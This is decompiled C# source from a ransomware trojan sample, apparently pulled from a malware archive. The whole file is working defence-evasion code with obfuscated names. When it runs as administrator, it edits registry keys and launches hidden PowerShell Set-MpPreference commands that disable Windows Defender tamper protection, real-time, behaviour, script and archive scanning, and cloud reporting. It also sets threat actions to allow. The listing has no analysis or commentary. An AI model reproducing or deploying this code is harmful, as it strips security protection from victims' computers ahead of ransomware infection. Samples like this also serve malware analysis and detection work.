// Decompiled with JetBrains decompiler
// Type: kuMeqwHpurUBOD.tsUMgpGERQSp
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3332F4B9-4EB1-4ECC-A637-16FC36F853D6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-936a35ca214e9be1438c67a1153c854c28054994ce43f1eed39bb9dc52cb54dd.exe

using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace kuMeqwHpurUBOD
{
  public static class tsUMgpGERQSp
  {
    public static void fCjafLSvJfWq()
    {
      if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        return;
      tsUMgpGERQSp.cBoaCpdcXtnN("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
      tsUMgpGERQSp.cBoaCpdcXtnN("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
      tsUMgpGERQSp.cBoaCpdcXtnN("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
      tsUMgpGERQSp.cBoaCpdcXtnN("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
      tsUMgpGERQSp.cBoaCpdcXtnN("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
      tsUMgpGERQSp.VaRgcUquDTQo();
    }

    private static void cBoaCpdcXtnN([In] string obj0, [In] string obj1, [In] string obj2)
    {
      try
      {
        using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(obj0, RegistryKeyPermissionCheck.ReadWriteSubTree))
        {
          if (registryKey == null)
          {
            Registry.LocalMachine.CreateSubKey(obj0).SetValue(obj1, (object) obj2, RegistryValueKind.DWord);
          }
          else
          {
            if (registryKey.GetValue(obj1) == (object) obj2)
              return;
            registryKey.SetValue(obj1, (object) obj2, RegistryValueKind.DWord);
          }
        }
      }
      catch
      {
      }
    }

    private static void VaRgcUquDTQo()
    {
      Process process = new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "powershell",
          Arguments = "Get-MpPreference -verbose",
          UseShellExecute = false,
          RedirectStandardOutput = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true
        }
      };
      process.Start();
      while (!process.StandardOutput.EndOfStream)
      {
        string str = process.StandardOutput.ReadLine();
        if (str.StartsWith("DisableRealtimeMonitoring") && str.EndsWith("False"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -DisableRealtimeMonitoring $true");
        else if (str.StartsWith("DisableBehaviorMonitoring") && str.EndsWith("False"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -DisableBehaviorMonitoring $true");
        else if (str.StartsWith("DisableBlockAtFirstSeen") && str.EndsWith("False"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -DisableBlockAtFirstSeen $true");
        else if (str.StartsWith("DisableIOAVProtection") && str.EndsWith("False"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -DisableIOAVProtection $true");
        else if (str.StartsWith("DisablePrivacyMode") && str.EndsWith("False"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -DisablePrivacyMode $true");
        else if (str.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && str.EndsWith("False"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
        else if (str.StartsWith("DisableArchiveScanning") && str.EndsWith("False"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -DisableArchiveScanning $true");
        else if (str.StartsWith("DisableIntrusionPreventionSystem") && str.EndsWith("False"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -DisableIntrusionPreventionSystem $true");
        else if (str.StartsWith("DisableScriptScanning") && str.EndsWith("False"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -DisableScriptScanning $true");
        else if (str.StartsWith("SubmitSamplesConsent") && !str.EndsWith("2"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -SubmitSamplesConsent 2");
        else if (str.StartsWith("MAPSReporting") && !str.EndsWith("0"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -MAPSReporting 0");
        else if (str.StartsWith("HighThreatDefaultAction") && !str.EndsWith("6"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -HighThreatDefaultAction 6 -Force");
        else if (str.StartsWith("ModerateThreatDefaultAction") && !str.EndsWith("6"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -ModerateThreatDefaultAction 6");
        else if (str.StartsWith("LowThreatDefaultAction") && !str.EndsWith("6"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -LowThreatDefaultAction 6");
        else if (str.StartsWith("SevereThreatDefaultAction") && !str.EndsWith("6"))
          tsUMgpGERQSp.hWoYgMBbmoNfH("Set-MpPreference -SevereThreatDefaultAction 6");
      }
    }

    public static void hWoYgMBbmoNfH([In] string obj0) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
        Arguments = obj0,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    }.Start();
  }
}
